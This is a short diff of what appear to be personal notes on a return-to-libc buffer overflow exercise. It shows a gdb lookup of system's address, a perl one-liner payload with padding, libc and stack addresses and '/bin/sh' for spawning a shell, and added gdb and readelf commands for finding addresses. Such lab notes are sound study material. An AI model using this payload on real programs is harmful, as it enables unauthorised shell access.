@@ -20,3 +20,17 @@ print system -> 0xf7e1ce10
 ```
 $(perl -e 'print "A"x28 . "\x10\xce\xe1\xf7" . "JUNK" . "\x1c\xcf\xff\xff" . "/"x50 . "/bin/sh"')
 ```
+
+
+# commands
+
+```
+print system
+print exit
+
+info proc map 
+
+readelf -l P
+
+```
+
